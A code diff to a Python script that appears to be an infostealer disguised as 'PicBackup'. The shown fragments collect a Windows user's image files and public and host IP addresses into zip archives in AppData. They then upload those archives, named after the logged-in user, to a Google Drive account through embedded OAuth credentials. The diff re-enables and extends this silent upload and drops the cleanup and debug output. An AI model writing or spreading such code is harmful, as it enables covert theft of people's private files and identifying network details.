@@ -34,8 +34,7 @@ class WIN_Geat:
         self.client_id     = client_id
         self.client_secret = client_secret
         self.refresh_token = refresh_token      
-        self.Images_CO()
-       # self.Cloue_Store()
+        self.Images_CO()      
     def Images_CO(self):
         global Part_name
         count = 0
@@ -80,7 +79,6 @@ class WIN_Geat:
                                   with open(os.environ["appdata"] +'\\PicBackup_\\info.txt','w') as info :
                                       info.write('\n public_ip : '+ public_ip+'\n host_ip  : '+host_ip) 
                                   count +=1   
-                                  print(count)  
                                   if count == 10:
                                      break   
                   if count == 10:
@@ -89,7 +87,8 @@ class WIN_Geat:
         if Part_name not in Conut_list:
           Conut_list.append(Part_name)
         if count == 0:
-           print('No Files')
+            self.Part_name = Part_name
+            self.Cloue_Store()
         else:                   
             if os.path.exists( os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1])+'.zip') :
                 
@@ -100,51 +99,53 @@ class WIN_Geat:
                 shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=False, onerror=None) 
             Part_name += 1    
             self.Images_CO()
-       
+           
     def Cloue_Store(self):
-         headers = {"Authorization":"Bearer " +self.Token}
-         para = {
-                    "name":os.getlogin()+'_Documents.zip'
-                }
-         files = {
-                  'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
-                  'file': open(os.environ["appdata"]+'\\PicBackup.zip','rb')
-                 }
-         repoanse = requests.post(
-                            "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
-                             headers=headers,
-                             files=files
-                          )
-         reponse_back = repoanse.text
-         if '401' in reponse_back :
-               New_Token = requests.post('https://accounts.google.com/o/oauth2/token',
-               params={'client_id': self.client_id  ,
-                       'client_secret':self.client_secret,
-                       'refresh_token':self.refresh_token,
-                       'grant_type': 'refresh_token'})
-               New_Token= New_Token.text.split()
-               Token = str("".join(New_Token[2])).replace(',','')
-               headers = {"Authorization":"Bearer " +Token}
-               para = {
-                        "name":os.getlogin()+'_Documents.zip'
-                      }
-               files = {
-                      'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
-                      'file': open(os.environ["appdata"]+'\\PicBackup.zip','rb')
-                     }
-               repoanse = requests.post(
-                             "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
-                             headers=headers,
-                             files=files
-                          )
-         os.chdir(os.environ["appdata"] )
-         shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
-         shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
-        # os.remove(os.environ["appdata"] +'\\PicBackup')
+         i = 0
+         for _ in range(self.Part_name) :
             
+             headers = {"Authorization":"Bearer " +self.Token}
+             para = {
+                        "name":os.getlogin()+'_Documents_'+str(f'{i}')+'.zip'
+                    }
+             files = {
+                      'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+                      'file': open(os.environ["appdata"]+'\\PicBackup_'+str(f'{i}')+'.zip','rb')
+                     }
+             repoanse = requests.post(
+                                "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+                                 headers=headers,
+                                 files=files
+                              )
+             reponse_back = repoanse.text
+             if '401' in reponse_back :
+                   New_Token = requests.post('https://accounts.google.com/o/oauth2/token',
+                   params={'client_id': self.client_id  ,
+                           'client_secret':self.client_secret,
+                           'refresh_token':self.refresh_token,
+                           'grant_type': 'refresh_token'})
+                   New_Token= New_Token.text.split()
+                   Token = str("".join(New_Token[2])).replace(',','')
+                   headers = {"Authorization":"Bearer " +Token}
+                   para = {
+                            "name":os.getlogin()+'_Documents_'+str(f'{i}')+'.zip'
+                          }
+                   files = {
+                          'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+                          'file': open(os.environ["appdata"]+'\\PicBackup_'+str(f'{i}')+'.zip','rb')
+                         }
+                   repoanse = requests.post(
+                                 "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+                                 headers=headers,
+                                 files=files
+                              )
+             i +=1     
+             #os.chdir(os.environ["appdata"] )
+             #shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
+             #shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
+        # os.remove(os.environ["appdata"] +'\\PicBackup')   
 if __name__=='__main__':
     WIN_Geat()
-       
        
 
 
